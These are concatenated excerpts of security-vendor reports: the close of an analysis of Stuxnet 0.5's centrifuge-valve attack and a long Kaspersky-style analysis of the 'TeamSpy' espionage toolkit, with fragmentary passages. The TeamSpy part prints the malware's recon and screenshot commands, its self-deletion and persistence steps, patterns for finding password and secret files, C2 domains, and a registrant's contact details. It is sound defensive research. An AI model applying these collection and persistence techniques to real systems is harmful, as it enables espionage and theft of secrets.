          is used for replay in later stages.If the normal pressure operating pressure wasn’t obtained properly in state 2, state
          3 is actually skipped and hardcoded default values are used instead.State 4:

          State 4 waits for the desired pressure change or other predetermined time limits before proceeding to state 5.If any
          of the following conditions are met, the code will continue to state 5:
          •	 The pressure of the stage 10 or stage 11 transducer (these are likely transducers for or near the feed stage) has an
             absolute value greater than 280 units above the expected value and greater than five times the expected value.•	 46 minutes after the state of an auxiliary valve has been modified from the original state recorded in state 1, with
             the exception of auxiliary valve number 17 which is likely a stage valve near the product end.•	 2 hours and 3 minutes after the attack started (since state 2) without any centrifuge valve state changes.•	 2 hours and 3 minutes since at least four centrifuge valve states have been modified from the original state
             recorded in state 1.State 5:

          In state 5, all the auxiliary valves are opened except valve numbers 17, 18, and 20.Before continuing to state 6, the



<footer>                                                                                                                                   Page 11</footer>
<header>
                                                                                                    Stuxnet 0.5: The Missing Link
Security Response</header>

          code waits for at least 2 minutes and 53 seconds.State 6:

          During state 6, fake values continue to be replayed and any attempts to change device values are prevented for 6
          minutes and 58 seconds.State 7:

          Data is reset and the code returns to state 0.By closing all valves except the initial feed stage valves, UF6 will continue to flow into the system.This act alone
          may cause damage to the centrifuges themselves.However, the attack expects the pressure to reach five times the
          normal operating pressure.At this pressure, significant damage to the uranium enrichment system could occur and
          the UF6 gas could even revert to a solid.Whether the attack succeeded in this manner or not remains unclear.Even if the attack did succeed, the attackers
          decided to move to a different strategy in the Stuxnet 1.x versions, attacking the speed of the centrifuges instead.</section>
<section>


<heading>Conclusion</heading>
          Stuxnet 0.5 clarifies the evolution and history of Stuxnet.Stuxnet clearly became more aggressive over time and
          switched development platforms as it evolved from 0.5 versions to later 1.x versions.Key parts of the 417 attack code missing from versions 1.x is fully implemented in Stuxnet 0.5.This demonstrates
          that the 417 attack code was the first attack strategy implemented by Stuxnet.This original 417 attack code
          attempted to modify valve states during the uranium enrichment process at Natanz, Iran, to cause damage to the
          centrifuges and the system as a whole.Figure 4
                                                                                             The success of Stuxnet 0.5 remains
         Low-enriched uranium production (source ISIS)                                       unknown.However, the chart
                                                                                             in figure 4 references uranium
                                                                                             enrichment production at Natanz
                                                                                             to key milestones of Stuxnet
                                                                                             development.More information is available at
Liam O Murchu - Development Manager
Stephen Doherty - Sr Threat Intelligence Analyst                                                                                   www.symantec.com or by connecting with
Eric Chien - Distinguished Engineer                                                                                              Symantec at: go.symantec.com/socialmedia.For specific country offices and contact num-                                  Symantec Corporation                                           Copyright © 2013 Symantec Corporation.All rights reserved.Symantec and the Symantec logo are trademarks or registered
bers, please visit our Web site.For product                                    World Headquarters                                               trademarks of Symantec Corporation or its affiliates in the
information in the U.S., call                                                     350 Ellis Street                                             U.S. and other countries.Other names may be trademarks of
                                                                                                                                                                                  their respective owners.toll-free 1 (800) 745 6054.Mountain View, CA 94043 USA
                                                                                +1 (650) 527-8000
                                                                                www.symantec.com


         Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
         Corporation.NO WARRANTY .The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use.Any use of the
         technical documentation or the information contained herein is at the risk of the user.Documentation may include technical or other inaccuracies or typographical
         errors.Symantec reserves the right to make changes without prior notice.</section>
</doc>Some parts of this operation extended into Western nations and the
Middle East as well, with victims in sectors such as energy and heavy industry manufacturing.The attackers performed their
intelligence gathering and surveillance partly using TeamViewer (http://www.teamviewer.com/en/index.aspx), a legitimate
support software package commonly used for remote administration.In addition, they deployed custom written intelligence
gathering components and lateral movement utilities.We are calling this threat actor the “TeamSpy crew” because of their preference for using the legal software TeamViewer as a
main part of their toolset.</section>
<section>
<heading>So, Team What?</heading>
TeamSpy.This covert cross-nation, cyber surveillance data theft and monitoring operation may not have recruited technical
wizards for their team.But the use of legitimate, signed software packages in addition to custom made software, along with
various dll path hijack tricks, allowed the threat actor to conduct effective operations targeting hundreds of victims, including
high level/high value individuals.According to its web site, TeamViewer is a “All-In-One Software for Remote Support and Online Meetings”.It is “free for
private use” and is installed by “more than 100,000,000 users spread over more than 200 countries”.TeamViewer has versions
available for Windows, Mac OS X, Linux, iPhone or Android, making it a very flexible remote administration tool.<noncontent>PAGE 1 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
<figure></figure>
                                                <caption>The TeamViewer web site</caption>

Compared to Poison Ivy and other Remote Access Tools (RATs) that have been in the news for years, TeamViewer has an
advantage which makes it attractive to cybercriminals: is comes signed, adding to its seeming legitimacy.<figure></figure>

In addition to TeamViewer, the TeamSpy operations are supplemented by a variety of custom-built surveillance modules.Instead of maintaining all operations with the TeamViewer RAT, the team developed their own reconnaissance and stealth
modules.Examples include:

<figure></figure>


It seems that at least at heart, one of the TeamSpy crew members dreams of being a graphic artist.Or maybe they tried to
send security researchers a hidden message?</section>
<section>
<heading>Observations about the TeamSpy Toolset - “No find glue file!”</heading>
The toolset demonstrates clever, although lazy choices about legitimate software and certificate abuse, along with a minimal
but effective effort at using simple and crude custom encryption algorithms.We’ve analyzed in depth two command and control servers used by the attackers but we are aware of several others used in
the campaign.The two servers we analyzed are “politnews.org” and “bannetwork.org”.<noncontent>PAGE 3 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
On the command and control servers, the attackers maintain tools and modules, some obfuscated and named as JPG files.The
“.JPG” files maintain hidden executable codes, and are simply encoded with a rolling XOR encryption using the same key across
all of the components: “0x0e0f101112”.There are quite a few traces left by the attackers, which normally can give you hints about attaсkers’ profile.For example, a keylogger tool used a system event called "__klgskot__".While "klg" stands for keylogger, "skot" is a Russian
word meaning "livestock".There are many more Russian language traces in this malware toolkit.The version of Teamviewer server which is used as a
part of malware bundle is Russian localized.It at least includes TeamViewer_Resource_ru.dll file which has a set of Russian
strings used by the application.A couple of other modules, while searching for files on the hard drive, looked for those containing "pass", "secret", and
Russian equivalents "парол" and "секрет".In addition to Russian, there was a Georgian equivalent of "secret", but written in
the Latin alphabet: "saidumlo".In the recent Red October report, our research noted liberal use of Cyrillic characters throughout code and files...“Another
noteworthy fact is in the first line of this file, which is a command to switch the codepage of an infected system to 1251.This is
required to address files and directories that contain Cyrillic characters in their names”.Here is a screenshot demonstrating
the system codepage switch in a malicious batch file:



<figure></figure>
                                                 <caption>Usage of CP1251 in Red October</caption>

Just like Red October, TeamSpy components maintain the same sort of language switch to Cyrillic throughout code and files.Here, we note that an entire TeamSpy SQLite database’s strings used to house stolen victim data, located on one of the major
C2, is specified to default to the Cyrillic character set.<figure></figure>


<noncontent>PAGE 4 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
Tables within the database are explicitly configured to use the Cyrillic character set.Here is the log table, filled with victim
check-in records:

<figure></figure>


The statistic table, along with all of the others, are explicitly Cyrillic:

<figure></figure>


Also, some specifics come from C&C domain names, such as "bulbanews.org" and "kartopla.org".The words "bulba" and
"kartopla" are written in Latin-Belarusian and Latin-Ukrainian, both words mean “a potato”.Interestingly, among ex-USSR
countries, Belarusians are jokingly called "bulbashi" which means "potato people" due to the popularity of this vegetable in
local agriculture.One of the modules we found, called footer has LANG_RUSSIAN property set in the resource section of the executable.Also, one of the database tables discovered at a C&C server contained some text in Russian written with latin alphabet:

<figure></figure>


<noncontent>PAGE 5 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
A rough translation of the highlighted strings from Russian to English:

"Obshie manevri.Ispolzovat' tolko s razreshenija S-a" = "General maneuvers.Use only after approval of S-a"."vkluchenie oomask" = "switching oomask on"

"Ispolzovanie bilda ..." = "Using build ..."

The same C&C we analyzed had a full FTP access log with source IP that uploaded malicious modules in 2012 (some of them
were already removed from the server, but the names and sizes remained in the log file).This log file also shows intensive
usage of Russian language in the file names:

<figure></figure>


The filenames include "можно выдавать" which is translated as "ready to spread", "Проверка на прото" meaning "Protocol
checks".The most amusing part of this log is "crypted_bulba" which is translated as "encrypted potato".Everyone is familiar
with baked potato or mashed potato, however this is our first touch with "encrypted potato".The SystemInfoSave module lists all files in the “Program Files” folder which are newer than the hard-coded date: “22
November 1963”.The date is clearly an “Easter Egg”, with several important incidents linked this specific date:

    ●    US President John F. Kennedy is assassinated in Dallas.●    Aldous Huxley, the author of “Brave New World” and many other titles, dies.●    CS Lewis, the author of “Chronicles of Narnia” and many other titles, dies.</section>
<section>
<heading>Maintaining Teamwork and Infrastructure</heading>
Our investigation of the team’s infrastructure centers around two domains used for command-and-control: “politnews.org”
and “bannetwork.org”.But clearly, the strategy guiding this team is to pull off multiple “watering hole” attacks, and
sometimes pollute ad networks, inefficiently blanketing the region they are most interested in with malvertizing and
redirections to their malicious sites.These two servers have been heavily used over years of attack campaigns, with more
recent servers receiving tens if not hundreds of hits in the past week.The two servers resided at several hosts over the past decade, but from 2010, both domains were maintained at Russian
provider Host Telecom.(known malicious IP for “bannetwork.org”: “89.188.104.7”).For the most part, these systems maintain identical toolsets, structure, software and accounts.Both of these systems hosted
an FTP server and an Apache HTTP web server, along with the same user accounts for running each.The HTTP servers were
used to serve “job.txt”, which maintained a set of system commands for agents checking in, among other files described
below.Interestingly, other files included “html” pages and exploits related to the well-known exploit kit “Eleonore Exploit
Pack”, created and maintained by Exmanoize.Also, one of the server scripts to collect infection success statistics mentions the Eleonore exploit kit by name:


<figure></figure>


And one of the more recent, current sites, “checkmeil.com”, is serving both malicious java and pdf files.Of course, just like
Eleonore started serving couple of years ago, it defaults to deliver a malicious JAR file first, prior to other exploits potentially
sent to the victim system.<noncontent>PAGE 7 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
<figure></figure>
The 2012 version of “door.jar” (CVE-2012-0507) exploit is blocked proactively by our AEP functionality at runtime and detected
by Kaspersky products as “HEUR:Exploit.Java.CVE-2012-0507.gen".A malicious PDF is served if the Java Runtime is not present on the system.Our products detect this particular malicious file as
Exploit.JS.Pdfka.gbf.Most of the TeamSpy servers are using a free, Russian open source tool named “ReaderRssPhp 1.0”.This is a set of PHP scripts
designed to “read and display RSS feeds on your site”.Most likely, the attackers planned their attacks well in advance and built
a set of web sites using these scripts to provide news aggregation channels serving content at least somewhat relevant to their
target victims’ favorite web sites.<figure></figure>


Over the past years, the attackers added exploit packs like Eleonore on their news aggregation sites.Then, the attackers
injected iframes into carefully selected web sites frequently visited by their target victims.The iframes redirect these target
visitors (and some extras) to their previously-prepared malicious sites.For instance, redirections from “konflikt.ru” to the
attackers’ “bannetwork.org” started in October 2005.In February 2006, users were redirected from “daymohk.org” to
“bannetwork.org”, followed by “www.turkmenistan.gov.tm” and “chechentimes.net” in March.The list of infected watering
hole sites continued to grow from there.These
can be seen in the C2 online interface which lists the IP, last access time and the user status:




<noncontent>PAGE 9 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
<figure></figure>
The attacker can then connect to any of the online IPs using the known login/pass combination and silently spy on the victims.</section>

<section>
<heading>Command Server Directory Structure and Contents</heading>
The command and control servers we analyzed maintain the same “/public_html” file contents.The
username and password for the database connections are hardcoded in the C2 scripts, for instance:

<figure></figure>


Several tables exist in the databases, named “stat_TV”, “stat_TV_log”, “stat”, “stat2”, “stat5058”, “statistic”.These carry
various information about the victims that connected to the C2 as well as unique data that allows the attackers to interact
with them.</section>

<section>
<heading>Lesser Used Spy Tools</heading>
It seems that attackers outsourced much of their infiltration development work, utilizing exploit kits like Eleonore and others.It is the upfront investment of vulnerability research and exploit development and expertise that are beyond the reach of
many interested parties like TeamSpy that results in this outsourcing.In addition to the commodity exploit packs, their sites
are also known to spread the Ardamax keylogger, another cheap, commercially available surveillance package.It collects statistics on malware incidents from around the
world.The TeamSpy attacks have been recorded in several countries around the world, with the highest number of incidents
being in Russia and Ukraine.Here’s a map of infections:



<figure></figure>
                                      <caption>“Teamspy” KSN detections (unique PCs) - March 2013</caption>

In addition to the KSN reports, we were able to extract a list of victims from two command and control servers’ databases.These are available to anyone who knows the URL which serves these lists.It should be noted that the statistics from the command and control servers include only the victims that were infected with
the Teamviewer-based package.The command servers have bigger logs which possibly include many other victims, although
the nature of these is impossible to determine because the respective database tables are not handled anymore by the
existing scripts.For instance, the C2 at “bannetwork.org” has an extended log of supposed victims, spanning for two years, with the earliest
entry from 23 Sep 2011 and the latest from March 2013.<figure></figure>
                            <caption>Number of unique victims per month handled by the bannetwork.org C2</caption>

A peak can be observed on Jan 2012 - when the attackers infected a large amount of victims, 323.In regards of victim’s profiles, in general, the IPs do not appear to hold useful information.Some do belong to specific
networks, however, it’s unclear if they are researchers or true victims.This
domain appears to have been an active C2 between May 2010 - May 2011.The Google safe diagnostic page for this domain
points to an interesting blog:




<noncontent>PAGE 16 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
<figure></figure>
The domain “master-sudtyaib.narod.ru” appears to host a blog dedicated to freeing the Russian political activist “Alexander
Sokolov” (for details: http://www.fidh.org/IMG//pdf/obs_report_russia_sokolov.pdf) .The page does not appear to be
malicious at the time of writing of this analysis, however, the file “sokolov.html” does have an injected iframe which points to
another domain:

<figure></figure>


The iframe points to “countlist.org/xmps5060”, which was no longer available when we tested it.The domain “countlist.org”
has been sinkholed by Kaspersky Lab for security reasons.Kaspersky name: Trojan-Ransom.Win32.PornoBlocker.aei

Sends stolen information to hxxp://www.politnews.org/dd_4.php, hxxp://www.bannetwork.org/dd_4.php
</section>


<section>
<heading>Other Teamviewer based campaigns</heading>
We were first alerted by attacks from unknown assailants which were using runtime patched Teamviewer as part of their
toolset in May 2012.The attacks (see https://charter97.org/ru/news/2012/4/28/51488/, story in Russian) were using a
number of .RU domains as command and control, namely “kosmoaministrator.ru”, “adminplagin.ru” and “korakura.ru”.These
domains are now sinkholed by Kaspersky Lab.<noncontent>PAGE 18 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
In addition to these attacks, we discovered a number of other command and control servers used by attackers which employ
the Teamviewer-based attack toolkit.Based on our research, it seems the Teamviewer based trojans appeared in the Russian underground forums a couple of time
ago and were readily available for purchase by interested parties.At the moment, it is unclear if there is a connection between all these attackers (such as the ones from the charter97.org
story) and the “TeamSpy Crew”.The TeamSpy Crew differentiates itself by mostly using “.org” domains for command and
control.On these command and control servers, they maintain a specific infrastructure and directory structure, for instance,
serving the malicious “TeamViewer.ico” installer.</section>

<section>
<heading>Conclusions</heading>
According to existing information, the TeamSpy crew has been active at least since 2008, possibly going back to as early as
2004 if we are to believe the domain registration dates and consider the news aggregation channels.During the years, the
team has been focusing on attacking a variety of targets, ranging from activists and political to heavy industry and national
information agencies.Some of the aspects of this operation, such as keywords and usage of Russian terms remind us of Red October, although there
are no direct links at the moment.If we are to compare it to Red October, the TeamSpy Crew and the tools they use are far
less sophisticated and professional.To attack their targets, the TeamSpy crew relied on a variety of custom tools, designed to collect “special” and interesting
documents, such as those containing the word “secret” in their names.The special name “saidumlo” (Georgian - “secret”)
probably indicates at least some of the victims were in Georgia or from Georgia.The most recent method used by the TeamSpy crew involved the using of Teamviewer, a legal remote administration tool.Since Teamviewer is normally used in a wide range of conditions, it is not normally detected by security software with default
settings.In addition, the modules are validated with digital signatures, once again, making them “trustworthy” to a range of
whitelisting software.Unlike Red October, where many IPs could be traced to Governments and Governmental institutions based on WHOIS data, in
this case, the vast majority of IPs belong to ISPs which do not advertise such information.In case of TeamSpy crew, except for
a very few cases, the identity of the victims remains a mystery.</section>



<noncontent>PAGE 19 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
<header>Appendix A.Mezhevaya, dom 26, kv.15

        Registrant City:Kiev, UA 03164

        Registrant Email:balabko@i.ua



checkmeil.com

        ENOM, INC.This file is a special Dll module that uses a vulnerability in TeamViewer v6 known as Dll-hijacking.If this file is stored in the
same folder as TeamViewer.exe, then when TeamViewer is started it will show no warning, no popups, no systray icons and
will silently continue working providing remote access to the infected machine.This module not only disables TeamViewer
popups but also extends its functionality to the classical HTTP bot supporting a set of commands.This module installed with
Teamviewer 6 allows the attackers to access computer desktop remotely, activate webcam or microphone, download or
upload files to the infected machine and many more.</section>
<section>
<heading>DllMain</heading>
The Module execution starts from the initialization procedure.First, the code searches for “tv.cfg” file in local directory and
then common system paths, such as C:\Windows, C:\Windows\System32.The code uses non-standard way to pass some arguments to the called function.This is most likely done to harden manual
analysis or break automated analysis of the code.<noncontent>PAGE 25 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
<figure></figure>
                  <caption>Non-standard push of the “tv.cfg” string offset to the stack</caption>

If the tv.cfg file wasn't found the process exits.If it was found, the module gets unique system ID, which is a hashed value of
system drive Volume Serial Number.To hash the Volume Serial Number two types of hash algorithms are used: custom
SHL/SHR/OR-based algorithm and then MD5.The result is stored in a hex-string which is used as a decryption key for the tv.cfg
and part of the code in current file.Alternatively a hash of 792 bytes of executable code from TeamViewer.exe is used for
tv.cfg decryption.After that the module decrypts tv.cfg using RC4 algorithm.If it is not there, the executions stops.Then the module decrypts string data and extra code from its own data and code section.The data is stored in TLS section of
the parent process.After using some of the file parts, the module overwrites them with 0-byte values to change the module in memory and
possibly avoid detection or dumping of the module.This is the end of initialization part.Next, it starts main procedure, which loads export functions from the real avicap32.dll located in system directory
(C:\Windows\System32\).It also gets current Windows OS version and creates autorun key, under value specified in the tv.cfg.Currently it is

HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchost

Then the module patches the hosting TeamViewer process.In the second stage the module loads “kl.dll” library from the current directory and imports two functions: “Init” and “Rdp”.After that it calls “Init” function, waits 32 milliseconds allowing kl.dll to initialize and calls “Rdp” function from the same
library.The result of that call is submitted to the C2 via HTTP Post with Content-Type: application/x-www-form-urlencoded
header value.<noncontent>PAGE 28 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
In parallel a new thread is created, which waits for a signal to search *.bin files in the module directory, encrypt with szlogkey
value from tv.cfg using RC4 algorithm and upload to the FTP server specified in the tv.cfg.After uploading the files are deleted
from the filesystem using simple DeleteFileA API call.</section>
<section>
<heading>Thread #1 (bot updater):</heading>
Locates current process main executable and checks file version and file attributes.If the file version, stored in the file version
info section is not equal to “6.0.10722.0” the process terminates.If the attributes do not contain Hidden, System, then the
attributes are set (Hidden and System) for the file and the process is restarted.After that it will connect to the Command and
Control (C2) server and fetch updated modules

by the following URLs:

http://<server name>/<filename>, where

<server name> is a value from tv.cfg file (newslite.org).<filename> is one of the values from the ebedded encrypted string list:



    ●             TeamViewer_Desktop.exe
    ●             tv_w32.exe
    ●             tv_x64.exe
    ●             TeamViewer_Resource_ru.dll
    ●             tv_w32.dll
    ●             tv_x64.dll
</section>

<section>
<heading>Thread #2 (self-removal):</heading>
This thread creates a subthread which waits for a special event.If other thread fires the event, the current thread goes
through a list of embedded filenames, which includes

kl.dll, avicap32.dll, tv.cfg and changes file attributes to Hidden and System (which removes ReadOnly if set).If it finds any of these
processes running, it immediately terminates three processes (which ids are stored in current module memory) and current
process.This is done in a never-ending loop with high priority – sleep time between check iterations is 1 millisecond.The
algorithm designed to have different process termination procedures for Windows NT 5.x and Windows NT 6.x, however
currently it simply calls ExitProcess API function.</section>
<section>
<heading>Thread #4 (temp-cleaner):</heading>
This thread searches for tvicap32.dll and tl.dll files in the directory of current executable.It unloads tl.dll, if it is loaded and
then attempts to delete both files in a loop with delay of 1 second until it succeeds.</section>
<section>
<heading>GetIOSData tool</heading>
Known variants:
<figure>

 MD5                                                     Compilation date                            Linker version


 83a1634f660d22b990b0a82b1185de5b                        1992.06.19 22:22:17 (GMT)                   2.25

</figure>


The file is a PE EXE file created in Borland Delphi.This file is a tool to collect all local *.plist files from user's Application Data directory.Plist or property list files are files that
store serialized objects on Apple operating systems.These files may appear in Apple iTunes folders and may contain
information about devices connected to the current system in the past.</section>
<section>
<heading>Main</heading>
This simple module gets searches for “*.plist” files in current user %APPDATA% directory.All discovered files are immediately
copied to a directory with hardcoded path “%SYSTEMDRIVE%:\ProgramData\Adobe\AdobeArm”, where %SYSTEMDRIVE% is
the system disk drive.If the directory “%SYSTEMDRIVE%:\ProgramData\Adobe\AdobeArm” doesn't exist, the copying process silently fails.<noncontent>PAGE 31 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
</section>
<section>
<heading>Bi tool</heading>
Known variants:
<figure>

 MD5                                                 Compilation date                   Linker version


 cd56d04639dd395a035bc2a2e11f5d3d                    2012.10.25 06:03:21 (GMT)          10.0</figure>




The file is a PE EXE file created in Microsoft Visual C++ 2010.It is a tool designed to collect information about the operating system and BIOS via WMI.</section>
<section>
<heading>Main</heading>
The module concatenates a string to run a command with cmd.exe:

         cmd.exe /c wmic os get /format:HFORM > %SYSTEMDRIVE%\ProgramData\Adobe\AdobeArm\sysdll155.html

         && wmic bios list /format:HFORM >> %SYSTEMDRIVE%\ProgramData\Adobe\AdobeArm\sysdll155.html

Execution of the commands above concatenates two HTML reports which contain two tables with information about running
OS and computer’s BIOS.</section>
<section>
<heading>FileList2 tool</heading>
Known variants:
<figure>

 MD5                                                        Compilation date                    Linker version


 6b3a74728f8683c0fa14a2675e5364c6                           2012.07.18 11:23:41 (GMT)           10.0</figure>




The file is a PE EXE file created in Microsoft Visual C++ 2010.This file is a tool to collect files basing on filename patterns.</list>
The temporary file name is created using GetTempFileNameA system API, which creates a temp file name of the following
format: <uuuu>.TMP (where uuuu is a hexademical number picked by the system).After copying the temporary log file is deleted with call to DeleteFileA.</section>
<section>
<heading>Footer tool</heading>


<noncontent>PAGE 35 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
Known variants:
<figure>

 MD5                                                   Compilation date                        Linker version


 4475a43a10300b8137f364d21d402b94                      2013.03.12 05:15:48 (GMT)               10.0</figure>




The file is a PE EXE file created in Microsoft Visual C++ 2010.Its size is 101’376 bytes.Its main purpose it to dump contents of
accessible network shares.No remote file copying is done.This tool simply collects information about the files such as file size
and file last modification time.This tool is very similar to the FileList2 tool with few difference:

It doesn't create a header in the log file and it has no internal tool ID.It also uses different application icons and resource
section language is LANG_RUSSIAN, SUBLANG_DEFAULT.It
also makes series of Sleep API additional calls probably to break signature based detections of some AV products.</list>
The file has resource section which has 3 resources, 2 of them have resource language set to LANG_RUSSIAN,
SUBLANG_DEFAULT.It has tiny size of 12288 bytes.Its main purpose it to log
keystrokes, copy text from clipboard and record foreground windows along with date/time and process names owning them.This tool aggregates information in local folder and doesn’t upload it anywhere.It has no network functions.</section>
<section>
<heading>Main</heading>
The main procedure starts from preparation to install current application in the system.If that event is found, the application exits to prevent
multiple instances of the application from running.If event doesn‘t exist it is created immediately.Next it checks if current executable is called WcfAudit.exe.If not it creates a shortcut file in the file referred above as LnkPath.Current executable is copied to the path referred above as ExePath.After that the process is restarted from ExePath.If installation to the system is completed, the application starts three threads:

Thread #1 (Selfremover)

This thread creates a system event object called “__klgkillsoft__” and waits for this event to be activated.When something
activates this event the thread removes the LNK file from Startup folder and renames current executable from WcfAudit.exe to
file with a decimal number in the name and no extension.The decimal number represents system tick counter value.Thread#2 (Keylogger)

This thread sets low level Windows keyboard hook, which allows the module to intercept keystrokes.The thread records all
keystrokes, foreground window names and textual clipboard data.Accumulated data is available for the Thread#3 which expects it in special buffer.<noncontent>PAGE 38 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>
Thread#3 (Logger)

This thread is started 30 seconds after Thread#2.It checks if XmlPath file referred above exists.If it exists it is moved to
LogPath directory, the name is changed to klg<Number>.klg, where Number is a decimal integer taken from current system
tick counter value.Then this file is opened and appended with new data received from Keylogger thread.Please note, that at
least empty file at XmlPath must be created, the keylogger starts saving collected data only if it finds file at XmlPath.If the LogPath directory doesn’t exist, it will be created.If the klg<Number>.klg file becomes larger than 1Mb, new file at XmlPath is created and moved back to LogPath directory
with new name klg<Number>.klg (current tick counter value is used).In the end LogPath directory is full of klg<Number>.klg
files, however there is a bug in this logics.If the system is rebooted it will not contains XmlPath will not exist and that means
that keylogger will not be active.However it can still be activated any time by creating the XmlPath file.The logs are stored in plaintext.Its size is 36’864 bytes.Its main purpose it to dump contents of
locally attached disk drives.No file copying is done.This tool simply collects information about the files such as file size and file
last modification time.This tool has internal code or “build id” in the log file: 02.02.01
</section>
<section>
<heading>Main</heading>
The main procedure starts from creating temporary file and prepare path for final output log, which is stored in
“%SYSTEMDRIVE%:\ProgramData\Adobe\AdobeArm\sysdll2.txt".After that a new thread is created which enumerates network accessible resources, including shared directories and network
printers and lists available files which names match any of hardcoded patterns.* - various “password” files used by different applications

         *.pgp – PGP encrypted files

         *.xls – MS Excel spreadsheets

         *парол* - files which contain part of Russian word “пароль” meaning “password”

         *секрет* - files which contain Russian word “секрет” meaning “secret”

         *secret*.*

         *saidumlo* - files which contain part of a Georgian transliterated word meaning “secret”

The file has resource section which has 3 resources, 2 of them have resource language set to LANG_ENGLISH,
SUBLANG_ENGLISH_US.Its size is 36’352 bytes.Its main purpose it to list all new network
servers and available network shares.No file copying is done.The tool is identical to NetScanFiles2, but instead of getting full information about files, it works only with servers and shares.This tool has internal code or “build id” in the log file: “02.01.01”
</section>
<section>
<heading>Main</heading>
The main procedure starts from creating temporary file and prepare path for final output log, which is stored in
“%SYSTEMDRIVE%:\ProgramData\Adobe\AdobeArm\sysdll2.txt".After that a new thread is created which enumerates network accessible resources and outputs it to the temp file.The log
string has the following format:



          Server:<Server name>

          Share:<Share name>

         Domain:<Domain name>

The resulting log file is prepended with special header:

[/N2.0-02.01.01.00:<size of data>]<collected data>

The file has resource section which has 3 resources, 2 of them have resource language set to LANG_ENGLISH,
SUBLANG_ENGLISH_US.Its size is 755’193 bytes.Its main purpose is to drop and run a
legitimate tool known as CmdCapture, which makes a screenshot and stores it in “sysdll5.jpg” file.</section>
<section>
<heading>Main</heading>
The main procedure starts from extracting data embedded in the file of current application.The code prepares some working strings:

         CmdCapture = C:\ProgramDara\CmdCapture\CmdCapture.exe

         LogFile = C:\ProgramData\Adobe\AdobeArm\sysdll555.txt

         LogDir = C:\ProgramData\Adobe\AdobeArm\

It checks magic number stored in the last 4 bytes of the file.It must be 0xFFFFAAAA.If the magic is found, it reads preceding 4
bytes.This DWORD value (PayloadLen) indicates the size of the embedded data.Then it copies PayloadLen bytes and to the
CmdCapture file and executes the following command:



         cmd.exe /c C:\ProgramDara\CmdCapture\CmdCapture.exe /d C:\ProgramData\Adobe\AdobeArm\ /f sysdll5.jpg >
         C:\ProgramData\Adobe\AdobeArm\sysdll555.txt



After that it attempts to self-delete.This tool is
publicly available for download, i.e.at the following URL:

http://www.softpedia.com/get/Multimedia/Graphic/Graphic-Capture/CmdCapture.shtml




This tool has even a help prompt, which can be called with /h commandline argument.Below is a part of it:

CmdCapture 2.0

Usage: [/d <directory>] [/f <filename>] [/h]



/d     Select folder to output captured image files.If you didn't specify file name with full path, or you left file name
parameter blank, a file with default name will be put into the folder specified in this area./f      Followed by the filename you'd like to use.CmdCapture uses the file extension to determine the output file type.The
extension should be one of the following values:

         png: Save a PNG file.jpg: Save a JPEG file.bmp: Save a Windows bitmap file.tif: Save a TIFF file.gif: Save a GIF file.The default file type is PNG.</section>
<section>
<heading>SystemInfo tool</heading>
Known variants:
<figure>

 MD5                                                  Compilation date                       Linker version


 5c7bf0bb019b6c2dcd7de61f89a2de2e                     2012.07.19 13:37:03 (GMT)              8.0
</figure>



PAGE 43 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013
The file is a PE EXE file created in Microsoft Visual C++ 2005.Its size is 32768 bytes.Its main purpose is to collect general
system information, including what software is installed, what services and processes are running on the system, information
about available local storage and its free space, user accounts and BIOS information.This tool has internal code in the log file: 02.03.01
</section>


<section>
<heading>Main</heading>
The main procedure starts from creating a temp file (TmpLog) and preparing a path for the final
report: %SYSTEMDRIVE%:\ProgramData\Adobe\AdobeArm\sysdll2.txt (FinalLog).</list>

After that the output of all commands is aggregated in a single file FinalLog.Its size is 42496 bytes.Its main purpose is to get information
about local system in a safe way, which shouldn’t trigger any security software, such as antivirus.It is designed to collect
information mostly about locally installed software.</section>
<section>
<heading>Main</heading>
The main procedure starts from creating a temp file to store preliminary tool report.After that it lists all files in “Program
Files” folder which are newer than hardcoded date: 22 November 1963.Its size is 34816 bytes.Its main purpose is to get information
about local network configuration, including IP addresses, DNS servers and possibly domain name.The module attempts to self-delete after execution by calling "cmd.exe /c del <ModulePath>" command.Its size is 40.0 KB (40,960
bytes).It is a dropper designed to copy, install itself, and maintain communcations with its C2, maintain persistence, download further
executable code, and enumerate windows looking for a browser to open and then log window contents.</section>
<section>
<heading>Main</heading>
Oddly, the module concatenates a couple of strings to run commands with cmd.exe and copy itself with several names, to
several locations, with its final location residing in the All Users\Application Data directory and a run key for itself added.First,
it concats the string and copies itself to "C:\Documents and Settings\All Users\Application Data\a-t_name.exe".It enumerates through process windows,
looking for Internet Explorer processes and subclasses the window to steal all web browsing content and write it to
c:\documents and settings\All Users\Application Data\sys32dll.txt, encrypting the data and sending stolen data back to the C2.</section>
<noncontent>PAGE 48 | The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013</noncontent>

</doc><doc>
<header>New Zero-Day Exploit targeting Internet Explorer Versions 9
through 11 Identified in Targeted Attacks</header>
<section>
<heading>Summary</heading>

